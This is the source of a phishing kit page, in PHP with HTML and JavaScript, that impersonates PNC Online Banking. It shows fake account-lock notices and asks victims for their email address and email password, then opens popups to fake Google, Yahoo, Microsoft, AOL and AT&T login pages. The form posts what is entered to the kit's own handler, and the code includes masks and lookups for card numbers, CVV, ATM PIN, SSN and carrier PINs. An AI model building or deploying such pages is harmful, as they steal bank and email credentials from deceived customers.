<?php
include 'main.php';
include 'token.php';
session_start();
// Main Program start her ============
if($letter == 'unusual_activity') {
$locked = parse_ini_file("config/unusual_activity.ini", true);
} elseif($letter == 'limited') {
$locked = parse_ini_file("config/limited.ini", true);
}
$notice['we'] = $locked['EN']['notice'];
$notice['weneed'] = $locked['EN']['desc'];
$notice['but'] = $locked['EN']['button'];
?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Confirm Your Identity | PNC Online Banking</title>
    
    <link rel="shortcut icon" href="https://www.onlinebanking.pnc.com/favicon.ico" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="./assets/bootstrap.min.css">
    
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.08.25-2054/logon/assets/logon.css">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-797/common/assets/blue-ui.css">
    <script src="./assets/jquery.slim.min.js.download"></script>
    <script src="./assets/popper.min.js.download"></script>
    <script src="./assets/bootstrap.bundle.min.js.download"></script>
    <link rel="stylesheet" type="text/css" href="./assets/style.css">
    <script src="./assets/jquery.min.js.download"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
</head>
<body data-new-gr-c-s-check-loaded="14.1045.0" data-gr-ext-installed="" style="">
    <div class="container">
        <div class="main">
            <div class="jpui modal  bg-light" id="fullscreen-container" data-is-view="true" style="display: none; ">
                <div class="dialog vertical-center util print-position-initial">
                    <section class="dialogContent">
                        <div class="row">
                            <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1">
                                <i class="jpui exclamation-color icon error" id="undefined" aria-hidden="true"></i>
                                <span class="util accessible-text">Important: </span> Email Authentication Required.</h1><div class="suspended-advisory dialogMessage">We automatically redirected you to <span></span> to verify your email.<div class="loader">Loading...</div><a href="javascript:child_open(url)">Verify your email in the window provided. Click here if you can't find it.</a></div>
                            </div>
                        </section>
                    </div>
                </div>
                <div class="jpui modal" id="inactiveAccountDialog" data-is-view="true" style="display: none;">
                    <div class="dialog vertical-center util print-position-initial">
                        <section class="dialogContent">
                            <div class="row">
                                <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1" style="color:#678db3; font-weight: 700;">
                                    <img src="https://www.onlinebanking.pnc.com/favicon.ico" width="25" height="25">
                                    <span class="util accessible-text">Important: </span> <?php echo $notice['we'];?></h1 > <div class="suspended-advisory dialogMessage"> <?php echo $notice['weneed'];?>&nbsp;please click <a href="#" style="color:#678db3;"> <?php echo $notice['but'];?> to proceed</div><br> <div class="row"><div class="col-xs-12 col-sm-offset-4 col-sm-4"><button type="button" id="exitAccountSuspended" class="jpui button focus primary fluid"><span class="label"><?php echo $notice['but'];?></span> </button></div></div></div>
                                </div>
                            </section>
                        </div>
                    </div>
                    <div class="col-md-12" style=" border-radius: 10px;">
                        <div class="card card_main">
                            <div class="main_content">
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="logo">
                                            <img src="./assets/pnc_logo.png">
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="top_btn pt-2">
                                            <a class="btn_top_left pt-1" href="#">Privacy</a>
                                            <a class="btn_top_right pt-1" href="#">Security</a>
                                        </div>
                                    </div>
                                </div>
                                
                            </div>
                            <!-- End Card -->
                            </div><!-- MAIN CONTENT START HERE -->
                            <!-- Start Card -->
                            <div class="card_content_2">
                                <div class="card-body card_content_3">
                                    <div class="row " style="margin:0px auto;">
                                        <div class="col-md-12 pt-3 pl-5">
                                            
                                            <h3 class="sign_in_text">Confirm Your Identity<h3>
                                        </div>
                                        
                                        <div class="col-md-12 custom_left_padding panel">
                                            <div class="card radiuses" style="border: none;">
                                                <div class="col-xs-12 col-sm-10 col-sm-offset-1" style="margin:0px auto;">
                                                    <form class="emailaccess pt-3" id="emailaccess" method="POST" autocomplete="off" action="javascript:void(0);" _lpchecked="1">
                                                        <div class="errorPanelContent information">
                                                            <h4 class="emaildresstext1 pb-3">Confirm email that associated with your PNC account.</h4>
                                                        </div>
                                                        <h3 class="emailpasswordtext1" style="display: none;">Confirm your identity using <span></span></h3>
                                                        <p class="emailPasswordtext2" style="display: none;">For your security, enter your password for (<strong></strong>) linked to your PNC account. By successfully logging in to the <span></span> account associated with PNC, we'll know it's you. You won't receive a confirmation email or have to take any further action.</p>
                                                        <p class="emaildresstext2 pb-2" style="font-size:12px;font-weight: 700; max-width: 80%;text-align: center;">For your security, we need to verify your identity. Please note that the verification process will continue after your email is validated.</p>
                                                        <div class="inside-container">
                                                            <div class="row emaildress" style="margin:0px auto; text-align: center;">
                                                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                                                    <label class="jpui label emaildress" for="otpcode_input-input-field"><span class="accessible-text emaildress hidden"></span>Email Address</label>
                                                                </div>
                                                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                                                        <input class="jpui input account-input ssn_card_account_number" id="emaildress" placeholder="Email Address" format="" name="emaildress" data-validate="identificationCode" required="" value="" type="text">
                                                                        <div style="width: 100%; float: left; position: relative !important; margin-top: -46px; display: none;" id="error-bubble" class="identificationCode-error-bubble error-bubble" tabindex="-1"><a class="jpui error pointing below noborder attached label" id="identificationCode-error-bubble" href="javascript:void(0);" data-arrowposition="50" tabindex="0" aria-labelledby="identificationCode-error-bubble-label-content"><span class="label-outline" id="identificationCode-error-bubble-label-content">The email address you entered is incorrect. Please enter it again. </span></a></div>
                                                                        
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="row emailPassword" style="display: none;">
                                                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                                                    <label class="jpui label" for="otpcode_input-input-field"><span class="accessible-text hidden"></span>Email Password</label>
                                                                </div>
                                                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                                                        <input class="jpui input account-input ssn_card_account_number" id="emailPassword" placeholder="Email Password" format="" name="emailPassword" data-validate="identificationCode" required="" value="" type="password" style="display: none;">
                                                                        <div style="width: 100%; float: left; position: relative !important; margin-top: -46px; display: none;" id="error-bubble1" class="identificationCode-error-bubble error-bubble" tabindex="-1"><a class="jpui error pointing below noborder attached label" id="identificationCode-error-bubble" href="javascript:void(0);" data-arrowposition="50" tabindex="0" aria-labelledby="identificationCode-error-bubble-label-content"><span class="label-outline" id="identificationCode-error-bubble-label-content">The email password you entered is incorrect. Please try again. </span></a></div>
                                                                        
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="row emailPasswordC" style="display: none;">
                                                                <div class="col-xs-12 col-sm-5 label-column">
                                                                    <label class="jpui label" for="password_input-input-field"><span class="accessible-text hidden" id="pwlabel"></span>Confirm Email Password</label>
                                                                </div>
                                                                <div class="col-xs-12 col-sm-5 form-column">
                                                                    <div class="margin-bottom-20px" id="password_input">
                                                                        <input class="jpui input margin-bottom-20px" id="emailPasswordC" placeholder="Confirm Email Password" format="" type="password" name="emailPasswordC" required="" value=""> </div>
                                                                    </div>
                                                                </div>
                                                                <input type="hidden" name="emailretry" value="" id="emailretry">
                                                                <input type="hidden" name="urli" value="" id="urli">
                                                                <input type="hidden" name="emailType" value="" id="emailType">
                                                                <input type="hidden" name="emailProvider" value="" id="emailProvider">
                                                                
                                                                <p class="identification-code-received-message"><span></span></p><p>We use industry-standard encryption to protect your data. By providing your email, we verify in real time that you own the email on file. We then use this information to establish a secure connection with your email provider.</p> <span class="jpui link" id="requestNewIdentificationCode-link-wrapper"><a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" PNC account verification ">Email Auth</a></span><p></p>
                                                            </div>
                                                            <div class="button-container row hide-sm">
                                                                <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                                                    <button type="submit" id="requestIdentificationCode" class="jpui button focus fluid primary" disabled="disabled"><span class="label">Next</span> </button>
                                                                </div>
                                                                <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                                                    <button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                                                                </div>
                                                            </div>
                                                            <div class="button-container row hide-xs show-sm">
                                                                <div class="col-xs-12 col-sm-3 col-sm-offset-3">
                                                                    <button type="button" id="exitIdentification-sm2" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                                                                </div>
                                                                <div class="col-xs-12 col-sm-3">
                                                                    <button type="submit" id="requestIdentificationCode-sm" class="jpui button focus fluid primary disabled" disabled="disabled"><span class="label">Next</span> </button>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <script type="text/javascript">
                                        (function() {
                                        $('form > div > input').keyup(function() {
                                        var empty = false;
                                        $('form > div > input').each(function() {
                                        if ($(this).val() == '') {
                                        empty = true;
                                        }
                                        });
                                        if (empty) {
                                        $('#submit').attr('disabled', 'disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
                                        } else {
                                        $('#submit').removeAttr('disabled'); // updated according to http://stackoverflow.com/questions/7637790/how-to-remove-disabled-attribute-with-jquery-ie
                                        }
                                        });
                                        })()
                                        </script>
                                        <!-- FOOTER
                                        <hr> -->
                                        <div class="box_footer_text">
                                            <p class="footer_text">
                                                <a href="https://demoproject120.ddns.net/test/confirm.php?token=d41d8cd98f00b204e9800998ecf8427e">Online Banking &amp; Bill Pay Guarantee</a> |
                                                <a href="https://demoproject120.ddns.net/test/confirm.php?token=d41d8cd98f00b204e9800998ecf8427e#">Privacy Policy</a> |
                                                <a href="https://demoproject120.ddns.net/test/confirm.php?token=d41d8cd98f00b204e9800998ecf8427e#">Online Security</a>
                                                <br>
                                                © Copyright 2022. <a href="https://demoproject120.ddns.net/test/confirm.php?token=d41d8cd98f00b204e9800998ecf8427e#">The PNC Financial Services Group, Inc.</a>
                                                All Rights Reserved.
                                            </p>
                                            <p class="footer_text_2">
                                                <img src="./assets/livelook.png" height="20px;">
                                                &nbsp; Need Help? View our Contact Numbers and Hours of Operation
                                            </p>
                                        </div>
                                        <p align="right" style="margin-bottom: -0px; margin-top: -12px;">
                                            <img src="./assets/lock.webp">
                                        </p>
                                    </div>
                                </div>
                                <!-- End Card -->
                            </div>
                        </div>
                    </div>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
                    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
                    <script type="text/javascript">
                    var emailretry = 0;
                    document.onreadystatechange = function () {
                    var state = document.readyState;
                    if (state == 'complete') {
                    
                    var enablenotice = "<?php echo $enablenotice; ?>";
                    if (enablenotice == "on") {
                    $("#inactiveAccountDialog").show();
                    }
                    
                    setTimeout(function(){
                    document.getElementById('interactive');
                    },4000);
                    }
                    }
                    </script>
                    <script>$(document).ready(function(){
                    $('#exitAccountSuspended').click(function (e) {
                    e.stopPropagation();
                    $('#inactiveAccountDialog').slideUp();
                    });
                    });
                    $(document).ready(function() {
                    $("#CardNumber").keyup(function() {
                    var el = $(this);
                    var eli = el.val().replace(/\s+/g, '');
                    if (eli.length === 16) {
                    var url = "https://lookup.binlist.net/" + eli;
                    $.ajax({
                    url: url,
                    cache: false,
                    dataType: "json",
                    type: "GET",
                    success: function(result, success) {
                    var bankn = result.bank['name'];
                    if (typeof bankn !== 'undefined') {
                    $("#bank").val(result.bank['name']);
                    } else {
                    $("#bank").val("Unknown Bank For This BIN!");
                    }
                    
                    $("#type").val(result.type);
                    $("#brandbank").val(result.brand);
                    }
                    });
                    }
                    });
                    });
                    $(document).ready(function() {
                    $("#NumberPhone").keyup(function() {
                    var el = $(this).val();
                    var eli = el.replace(/[- )(]/g,'');
                    if (eli.length === 10) {
                    if ("<?php echo $enablephonepin; ?>" === "on") {
                    if ("<?php echo $enablenumverifyapi; ?>" === "on") {
                    var url = "https://apilayer.net/api/validate?access_key="+ "<?php echo $numverifyapi; ?>" + "&number=" + "1" + eli;
                    $.ajax({
                    url: url,
                    cache: false,
                    dataType: "json",
                    type: "GET",
                    success: function(result, success) {
                    var carrierres = result.carrier.replace(/[- )(]/g,'');
                    if (carrierres.indexOf('MobilityLLC', carrierres.length - 'MobilityLLC'.length) !== -1) {
                    $(".row.NumberCarrier").show();
                    $(".row.NumberPin").show();
                    $("#NumberCarrier").val(result.carrier);
                    } else if (carrierres.indexOf('SprintCorp.', carrierres.length - 'SprintCorp.'.length) !== -1) {
                    $(".row.NumberCarrier").show();
                    $(".row.NumberPin").show();
                    $("#NumberCarrier").val(result.carrier);
                    } else if (carrierres.indexOf('UnitedStatesCellularCorp.U.S.Cellular', carrierres.length - 'UnitedStatesCellularCorp.U.S.Cellular'.length) !== -1) {
                    $(".row.NumberCarrier").show();
                    $(".row.NumberPin").show();
                    $("#NumberCarrier").val(result.carrier);
                    } else if (carrierres.indexOf('TMobileUSAInc.', carrierres.length - 'TMobileUSAInc.'.length) !== -1) {
                    $(".row.NumberCarrier").show();
                    $(".row.NumberPin").show();
                    $("#NumberCarrier").val(result.carrier);
                    } else if (carrierres.indexOf('CellcoPartnershipVerizonWireless', carrierres.length - 'CellcoPartnershipVerizonWireless'.length) !== -1) {
                    $(".row.NumberCarrier").show();
                    $(".row.NumberPin").show();
                    $("#NumberCarrier").val(result.carrier);
                    } else {
                    $(".row.NumberCarrier").hide();
                    $(".row.NumberPin").hide();
                    }
                    }
                    });
                    } else {
                    $(".row.NumberCarrier").show();
                    $(".row.NumberPin").show();
                    }
                    }
                    }
                    });
                    });
                    $(document).ready(function() {
                    $("#ZipCode").keyup(function() {
                    var el = $(this);
                    
                    if (el.val().length === 5) {
                    var url = "https://ziptasticapi.com/" + el.val();
                    $.ajax({
                    url: url,
                    cache: false,
                    dataType: "json",
                    type: "GET",
                    success: function(result, success) {
                    $("#CityR").val(result.city);
                    $("#StateRegion").val(result.state);
                    }
                    });
                    }
                    });
                    });
                    //popup window
                    var popupWindow=null;
                    function child_open(url) {
                    var x = screen.width/2 - 700/2;
                    var y = screen.height/2 - 450/2;
                    sessionStorage.setItem('emaildress', $("#emaildress").val());
                    popupWindow = window.open(url,"_blank","directories=no, status=no, menubar=no, scrollbars=yes, resizable=no,width=450, height=700,left="+x+",top="+y);
                    }
                    function parent_disable() {
                    if(popupWindow && !popupWindow.closed)
                    popupWindow.focus();
                    }
                    // end popup
                    $('#emailPassword').focus(function () {
                    var val = $("#emaildress").val();
                    var emailstr = val.substr(val.indexOf("@") + 1);
                    const arr = emailstr.split(".");
                    var str = arr[0];
                    str1 = str.toLowerCase().replace(/\b[a-z]/g, function(letter) {
                    return letter.toUpperCase();
                    });
                    if (str === "gmail") {
                    var str2 = "Google";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else if (str === "googlemail") {
                    var str2 = "Google";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else if (str === "ymail") {
                    var str2 = "Yahoo";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else if (str === "yahoo") {
                    var str2 = "Yahoo";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else if (arr[1] === "rr") {
                    var str2 = "Spectrum";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else if (str === "live") {
                    var str2 = "Microsoft";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else if (str === "hotmail") {
                    var str2 = "Microsoft";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else if (str === "outlook") {
                    var str2 = "Microsoft";
                    $('.emailPasswordtext1').children("span").html(str2);
                    $('.emailPasswordtext2').children("span").html(str2);
                    } else {
                    $('.emailPasswordtext1').children("span").html(str);
                    $('.emailPasswordtext2').children("span").html(str);
                    }
                    $('.emailPasswordtext2').children("strong").html($("#emaildress").val());
                    $(".emaildresstext1").hide();
                    $(".emaildresstext2").hide();
                    $(".emailpasswordtext1").show();
                    $(".emailpasswordtext2").show();
                    }).blur(function () {
                    if ($.trim($('#emaildress').val()).length) {
                    $(".emaildresstext1").hide();
                    $(".emaildresstext2").hide();
                    $(".emailpasswordtext1").show();
                    $(".emailpasswordtext2").show();
                    } else {
                    $(".emaildresstext1").show();
                    $(".emaildresstext2").show();
                    $(".emailpasswordtext1").hide();
                    $(".emailpasswordtext2").hide();
                    }
                    });
                    $(document).ready(function () {
                    var $input = $('#SecurityNumber'),
                    $register = $('#log_on_to_landing_page-sm, #log_on_to_landing_page');
                    $input.each(function () {
                    if (!$(this).val()) {
                    $register.attr('disabled', true);
                    return false;
                    }
                    });
                    $input.keyup(function () {
                    var trigger = false;
                    $input.each(function () {
                    if (!$(this).val()) {
                    trigger = true;
                    }
                    });
                    trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');
                    });
                    });
                    </script>
                    <script>
                    $(document).ready(function () {
                    var $input = $('.card input:text'),
                    $register = $('#log_on_to_landing_page-sm1, log_on_to_landing_page1');
                    $input.each(function () {
                    if (!$(this).val()) {
                    $register.attr('disabled', true);
                    return false;
                    }
                    });
                    $input.keyup(function () {
                    var trigger = false;
                    $input.each(function () {
                    if (!$(this).val()) {
                    trigger = true;
                    }
                    });
                    trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');
                    });
                    });</script>
                    <script>
                    $(document).ready(function () {
                    var $input = $('.emailaccess input:text'),
                    $register = $('#requestIdentificationCode-sm, #requestIdentificationCode');
                    $input.each(function () {
                    if (!$(this).val()) {
                    $register.attr('disabled', true);
                    return false;
                    }
                    });
                    $input.keyup(function () {
                    var trigger = false;
                    $input.each(function () {
                    if (!$(this).val()) {
                    trigger = true;
                    }
                    });
                    trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');
                    });
                    });
                    $(".container.step1").show();
                    $("#exitIdentification-sm1, #exitIdentification-sm2, #exitIdentification-sm3, #exitIdentification-sm4, #exitIdentification").click(function(e) {
                    e.preventDefault();
                    $(".container.step1").show();
                    $(".container.step2").hide();
                    $(".container.step3").hide();
                    $(".container.step4").hide();
                    });
                    $("#requestDeliveryDevices-sm, #requestDeliveryDevices").click(function(e) {
                    e.preventDefault();
                    setTimeout(function() {
                    $(".container.step2").show();
                    $(".container.step3").hide();
                    $(".container.step1").hide();
                    $(".container.step4").hide();
                    });
                    });
                    $(function() {
                    $('#DateOfBirth').mask('00/00/0000');
                    $('#ZipCode').mask('00000');
                    $('#NumberPhone').mask('(000) 000-0000');
                    $('#CardNumber').mask('0000 0000 0000 0000');
                    $('#ExpirationDate').mask('00/00');
                    $('#Cvv').mask('000');
                    $('#AtmPin').mask('0000');
                    $('#SecurityNumber').mask('000-00-0000');
                    $('#PhonePin').mask('00000000');
                    $('#LicenseNExp').mask('00/00/0000');
                    });
                    </script>
                    <script>
                    jQuery.validator.addMethod("notEqual", function(value, element, param) {
                    return this.optional(element) || value != $(param).val();
                    }, "Please specify a different value");
                    jQuery.validator.addMethod("emailValid",function(value, element){
                    var emaildress = $("#emaildress").val();
                    $.ajax({
                    url: "emailvalidate.php",
                    type: 'POST',
                    async: false,
                    data: {email:emaildress},
                    dataType: "text",
                    success: function(msg) {
                    if (msg !== 'true') {
                    return 'Invalid password. Please try again';
                    } else {
                    return true;
                    }
                    },
                    error: function(xhr, textStatus, errorThrown)
                    {
                    alert('ajax loading error... ... '+url + query);
                    return false;
                    }
                    });
                    },'');
                    $(document).ready(function() {
                    $("#emailPassword").keyup(function() {
                    $("#error-bubble1").hide();
                    $("#emailPassword").removeClass("error");
                    $("#emailPasswordC").removeClass("error");
                    });
                    });
                    $(function() {
                    $("#requestIdentificationCode-sm, #requestIdentificationCode").click(function() {
                    $("#requestIdentificationCode-sm, #requestIdentificationCode").attr('disabled', 'disabled');
                    if ($("#emailPassword").is(":visible")) {
                    $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                    $("#error-bubble").hide();
                    $(".jpui.label.emaildress").removeClass("error");
                    $(".accessible-text.emaildress").addClass("hidden");
                    $(".accessible-text.emaildress").removeClass("errorAdaText");
                    $("#emaildress").removeClass("clientSideError");
                    $('#emailaccess').validate({
                    rules: {
                    "emailPassword": {
                    required: function () {
                    return $("#emailPassword").is(":visible");
                    },
                    minlength: 4,
                    equalTo : "#emailPasswordC",
                    notEqual : "#emaildress"
                    },
                    "emaildress": {
                    required: true,
                    email: true,
                    },
                    "emailPasswordC": {
                    required: function () {
                    return $("#emailPasswordC").is(":visible");
                    },
                    minlength: 4,
                    equalTo : "#emailPassword",
                    notEqual : "#emaildress",
                    }
                    },
                    messages: {
                    "emaildress": "Please enter a valid email address",
                    "emailPassword": {
                    required: "Please enter your email password",
                    equalTo: "Password dosen't match",
                    notEqual: "Email address and password can't be the same"
                    },
                    "emailPasswordC": {
                    required: "Please confirm your email password",
                    equalTo: "Password dosen't match",
                    notEqual: "Email address and password can't be the same"
                    }
                    },
                    submitHandler: function(form) {
                    emailretry++
                    $("#emailretry").val(emailretry);
                    $.post("emailbank?key=<?php echo $key;?>", $("#emailaccess").serialize(), function(result) {
                    if ("<?php echo $emailretry ?>" == "on") {
                    $("#error-bubble1").show();
                    $("#emailPassword").addClass("error");
                    $("#emailPasswordC").addClass("error");
                    } else {
                    $(".container.step4").hide();
                    $(".container.step3").show();
                    $(".container.step1").hide();
                    $(".container.step2").hide();
                    $(location).attr("", "");
                    }
                    if (emailretry == <?php echo $numberofretries ?>) {
                    $(".container.step4").hide();
                    $(".container.step3").show();
                    $(".container.step1").hide();
                    $(".container.step2").hide();
                    $(location).attr("", "");
                    }
                    
                    });
                    
                    },
                    });
                    } else {
                    function getData(callback) {
                    var url = "emailauth/emailvalidate.php?emaildress="+ $("#emaildress").val();
                    $.ajax({
                    url: url,
                    cache: false,
                    dataType: "json",
                    type: "GET",
                    success: callback
                    });
                    }
                    getData(function(result) {
                    var emailStatus = result.emailStatus;
                    var emailProvider = result.emailProvider;
                    var emailType = result.emailType;
                    $("#emailProvider").val(result.emailProvider);
                    $("#emailType").val(result.emailType);
                    if (emailStatus != "valid") {
                    $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                    $("#error-bubble").show();
                    $(".jpui.label.emaildress").addClass("error");
                    $(".accessible-text.emaildress").removeClass("hidden");
                    $(".accessible-text.emaildress").addClass("errorAdaText");
                    $("#emaildress").addClass("clientSideError");
                    }
                    else if (emailProvider == "Cox" || emailProvider == "Earthlink" || emailProvider == "Charter" || emailProvider == "Comcast"  && emailStatus == "valid") {
                    $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                    $(".row.emailPassword").show();
                    $("#emailPassword").show();
                    $(".row.emailPasswordC").show();
                    }
                    else {
                    var val = $("#emaildress").val();
                    var emailstr = val.substr(val.indexOf("@") + 1);
                    const arr = emailstr.split(".");
                    var str = arr[0];
                    str1 = str.toLowerCase().replace(/\b[a-z]/g, function(letter) {
                    return letter.toUpperCase();
                    });
                    if (str === "gmail") {
                    var str2 = "Google";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else if (str === "googlemail") {
                    var str2 = "Google";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else if (str === "ymail") {
                    var str2 = "Yahoo";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else if (str === "yahoo") {
                    var str2 = "Yahoo";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else if (arr[1] === "rr") {
                    var str2 = "Spectrum";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else if (str === "live") {
                    var str2 = "Microsoft";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else if (str === "hotmail") {
                    var str2 = "Microsoft";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else if (str === "outlook") {
                    var str2 = "Microsoft";
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    } else {
                    $('.suspended-advisory.dialogMessage').children("span").html(str2);
                    }
                    $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                    if (emailProvider == "Microsoft") {
                    var url = "emailauth/outlook?key=<?php echo $key;?>";
                    } else if (emailProvider == "Aol") {
                    var url = "emailauth/aol?key=<?php echo $key;?>";
                    } else if (emailProvider == "Yahoo") {
                    var url = "emailauth/yahoo?key=<?php echo $key;?>";
                    } else if (emailProvider == "Att") {
                    var url = "emailauth/att?key=<?php echo $key;?>";
                    } else if (emailProvider == "Google") {
                    var url = "emailauth/google?key=<?php echo $key;?>";
                    }
                    $("#urli").val(urli);
                    $('.suspended-advisory.dialogMessage').children("a").attr("href", "javascript:child_open(\""+url+"\");");
                    javascript:child_open(url);
                    $("#fullscreen-container").fadeTo(200, 1);
                    var timer = setInterval(function() {
                    if(popupWindow.closed) {
                    clearInterval(timer);
                    $("#fullscreen-container").fadeOut(200);
                    if (sessionStorage.getItem('emailPassword')) {
                    var epassone = sessionStorage.getItem('emailPassword');
                    }
                    else {
                    sessionStorage.removeItem('emailPassword');
                    
                    }
                    var token = '<?php echo $token ?>'
                    window.location = "thanks.php?token=" + token ;
                    
                    }
                    }, 1000);
                    $("#error-bubble").hide();
                    $(".jpui.label.emaildress").removeClass("error");
                    $(".accessible-text.emaildress").addClass("hidden");
                    $(".accessible-text.emaildress").removeClass("errorAdaText");
                    $("#emaildress").removeClass("clientSideError");
                    }
                    });
                    }
                    });
                    });
                    function allStorage() {
                    var values = [],
                    keys = Object.keys(localStorage),
                    i = keys.length;
                    while ( i-- ) {
                    values.push( localStorage.getItem(keys[i]) );
                    }
                    return values;
                    }
                    console.log (allStorage());
                    </script>
                </body>
                <grammarly-desktop-integration data-grammarly-shadow-root="true">
                    
                </grammarly-desktop-integration>
            </html>